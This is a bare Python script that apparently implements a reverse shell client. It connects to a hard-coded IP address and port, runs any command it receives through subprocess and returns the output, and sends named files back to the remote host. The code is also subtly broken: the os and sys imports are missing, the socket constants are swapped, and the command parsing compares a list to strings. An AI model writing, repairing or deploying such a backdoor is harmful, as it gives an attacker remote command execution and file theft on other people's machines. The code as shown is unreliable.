 
import socket  
import subprocess  
import logging  
  
logging.basicConfig(level=logging.ERROR)  
  
def transfer(client, file_name):  
    try:  
        if os.path.exists(file_name):  
            with open(file_name, "rb") as file:  
                while True:  
                    bits = file.read(1024)  
                    if not bits:  
                        break  
                    client.send(bits)  
            client.send("DONE".encode())  
        else:  
            client.send("Unable to find the file".encode())  
    except Exception as e:  
        logging.error("Error occurred: {}".format(e))  
  
def execute_command(client, command):  
    try:  
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  
        client.send(result.stdout)  
        client.send(result.stderr)  
    except Exception as e:  
        logging.error("Error occurred: {}".format(e))  
  
def handle_command(client, command):  
    command_parts = command.decode().split()  
    if command_parts == "grab":  
        transfer(client, command_parts)  
    elif command_parts == "exit":  
        client.close()  
    else:  
        execute_command(client, command_parts)  
  
def connect(server_ip, server_port):  
    with socket.socket(socket.SOCK_STREAM, socket.AF_INET) as client:  
        try:  
            client.connect((server_ip, server_port))  
            logging.info("Connected to {}:{}".format(server_ip, server_port))  
            while True:  
                try:  
                    command = client.recv(1024)  
                    handle_command(client, command)  
                except Exception as e:  
                    logging.error("Error occurred: {}".format(e))  
        except KeyboardInterrupt:  
            logging.info("Interrupted")  
            sys.exit()  
        except Exception as e:  
            logging.error("Error occurred: {}".format(e))  
  
def main():  
    server_ip = "192.168.1.13"  
    server_port = 9999  
    connect(server_ip, server_port)  
  
if __name__ == "__main__":  
    main()  
